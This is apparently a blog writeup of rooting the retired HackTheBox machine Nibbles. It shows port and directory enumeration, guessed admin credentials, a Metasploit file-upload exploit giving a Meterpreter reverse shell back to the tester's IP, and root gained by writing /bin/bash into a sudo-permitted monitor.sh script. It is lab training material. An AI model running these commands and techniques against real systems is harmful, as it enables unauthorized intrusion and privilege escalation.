---
layout: post
title: "Writeup: HackTheBox Nibbles - with Metasploit"
description: "Rooting Nibbles using Metasploit."
tags: pentest hackthebox writeup
---

This series will follow my exercises in [HackTheBox][]. All published writeups are for retired HTB machines.
Whether or not I use Metasploit to pwn the server will be indicated in the title.
 
# Nibbles

_<small>Difficulty: Easy</small>_

_<small>Machine IP: 10.10.10.75</small>_

Let's start with a typical port scan.

```bash
sudo nmap -sS -T4 -p- 10.10.10.75

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 21:07 EDT
Nmap scan report for 10.10.10.75
Host is up (0.014s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.60 seconds
```

```bash
sudo nmap -sS -T4 -A -p 22,80 10.10.10.75

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 21:08 EDT
Nmap scan report for 10.10.10.75
Host is up (0.028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 4.2 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS                                                                                             
1   60.70 ms 10.10.14.1                                                                                          
2   60.87 ms 10.10.10.75
```

Looks like I'm exclusively dealing with the web server.
The web server home page is a blank "Hello World" page.
Looking at the source, there is a comment to go to `/nibbleblog/`.

![nibbleblog][]

I run [nikto][] on that page.

```bash
nikto -host http://10.10.10.75/nibbleblog/

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.75
+ Target Hostname:    10.10.10.75
+ Target Port:        80
+ Start Time:         2020-06-14 21:13:33 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-29786: /nibbleblog/admin.php?en_log_id=0&action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.                                                        
+ OSVDB-29786: /nibbleblog/admin.php?en_log_id=0&action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.                                                         
+ OSVDB-3268: /nibbleblog/admin/: Directory indexing found.                                                       
+ OSVDB-3092: /nibbleblog/admin.php: This might be interesting...                                                 
+ OSVDB-3092: /nibbleblog/admin/: This might be interesting...                                                    
+ OSVDB-3092: /nibbleblog/README: README file found.
+ OSVDB-3092: /nibbleblog/install.php: install.php file found.
+ OSVDB-3092: /nibbleblog/LICENSE.txt: License file found may identify site software.
+ 7866 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2020-06-14 21:17:04 (GMT-4) (211 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Nikto highlights an interesting `admin.php` page as well as a `README` file.
You never know what useful information could be in the README.
In this case, it returns some version information about this blog.

```markdown
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

dule - SimpleXML
* PHP module - GD
* Directory â€œcontentâ€ writable by Apache/PHP

Optionals requirements

* PHP module - Mcrypt
```

Running [gobuster][], I also identify a `/content` directory.

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -u http://10.10.10.75/nibbleblog/

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.75/nibbleblog/
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/14 21:14:27 Starting gobuster
===============================================================
/content (Status: 301)
/themes (Status: 301)
/admin (Status: 301)
/plugins (Status: 301)
/README (Status: 200)
/languages (Status: 301)
===============================================================
2020/06/14 21:16:42 Finished
===============================================================
```

![content dir][]

In the `/content` directory I find `http://10.10.10.75/nibbleblog/content/private/users.xml`, which contains a username, `admin`.
`http://10.10.10.75/nibbleblog/admin.php` presents me with a login page.

With [searchsploit][], I see that there is a Metasploit module for remote code execution that requires authentication.

```bash
artis3n@kali-pop:~/shares/htb/nibbles$ searchsploit nibble
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                          | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                           | php/remote/38489.rb
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Unfortunately, the `admin.php` login has an account lockout feature.
Either by waiting for a brute force attack to finish or by guessing, you can eventually find `admin / nibbles`.

In Metasploit, let's exploit the server with `exploit/multi/http/nibbleblog_file_upload`.

```bash
msf5 post(multi/manage/shell_to_meterpreter) > run

[!] SESSION may not be compatible with this module.
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.14.41:4455 
[*] Sending stage (980808 bytes) to 10.10.10.75
[*] Meterpreter session 3 opened (10.10.14.41:4455 -> 10.10.10.75:46316) at 2020-06-14 22:12:55 -0400

[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed


meterpreter > getuid
Server username: no-user @ Nibbles (uid=1001, gid=1001, euid=1001, egid=1001)
meterpreter > 
[*] Stopping exploit/multi/handler
sysinfo
Computer     : 10.10.10.75
OS           : Ubuntu 16.04 (Linux 4.4.0-104-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
```

While meterpreter lists `no-user`, this gets me a user shell as the `nibbler` user.
I can collect the user flag.

Checking `sudo` permissions, I see that `nibbler` can run a `monitor.sh` script from its home directory as root.
Convenient!

```bash
nibbler@Nibbles:/home$ sudo -l
sudo -l


sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

It appears that this file no longer exists on the system.
Perhaps this was used to create the server, and the administrator forgot to clean up this access?
Well, I can create my own `monitor.sh` script with the content `/bin/bash`.
This gives me a root shell.

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
monitor.sh/nibbler/personal/stuff/ 
sudo: unable to resolve host Nibbles: Connection timed out
root@Nibbles:/home/nibbler/personal/stuff#
```

[gobuster]: https://github.com/OJ/gobuster
[hackthebox]: https://www.hackthebox.eu
[nikto]: https://github.com/sullo/nikto
[searchsploit]: https://github.com/offensive-security/exploitdb#searchsploit

[content dir]: /assets/img/htb/nibbles/private-dirlist.png
[nibbleblog]: /assets/img/htb/nibbles/hidden-blog-dir.png
